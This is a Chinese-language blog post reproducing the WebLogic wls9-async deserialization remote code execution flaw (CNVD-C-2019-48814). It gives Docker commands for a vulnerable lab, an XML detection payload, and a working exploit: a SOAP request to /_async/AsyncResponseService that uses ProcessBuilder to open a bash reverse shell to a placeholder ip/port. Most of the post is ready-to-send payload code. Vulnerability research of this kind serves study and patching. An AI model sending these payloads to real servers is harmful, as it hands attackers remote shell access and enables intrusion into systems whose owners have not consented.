_posts/2019-8-2-CNVDC201948814.md

---
layout: post
title:  " weblogic 远程命令执行漏洞分析 (CNVD-C-2019-48814)"
date:   2019-8-2 10:18:43
categories: Development
author: co0ontty
categories: 安全开发 漏洞复现 ALL
tags: 安全开发 漏洞复现 ALL
describe: weblogic 远程命令执行漏洞
cover: '/assets/img/posts/0d543f9aec58561aabc164648a1809d8.png'
---
## weblogic 远程命令执行漏洞  (CNVD-C-2019-48814）
### 漏洞概述
该漏洞存在于 wls9-async 组件，这个组件主要作用是异步通讯服务，攻击者可以向 /_async/AsyncResponseService 路径下传入构造好的恶意 xml 格式的数据，传入的数据在服务器端反序列化时，执行其中的恶意代码，从而可以 getshell。
### 漏洞环境搭建
docker 快速启动：
```bash
docker pull ismaleiva90/weblogic12

docker run -d -p 7001:7001 -p 7002:7002 --restart=always ismaleiva90/weblogic12:latest
```
访问：ip:7001/_async/AsyncResponseService 查看 wls9-async 组件是否启动成功
![avatar](/assets/img/posts/20190426101059760.png)
nmap 检测插件 [weblogic.nse](https://github.com/Rvn0xsy/nse_vuln/tree/master/weblogic/CNVD-C-2019-4814)

### 漏洞复现
#### Poc：
向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="POC">
<array class="xx" length="0">
</array>
<void method="start"/>
</void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>
```
如果 res.status_code == 202 则可以判断存在漏洞

#### Exp：
向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
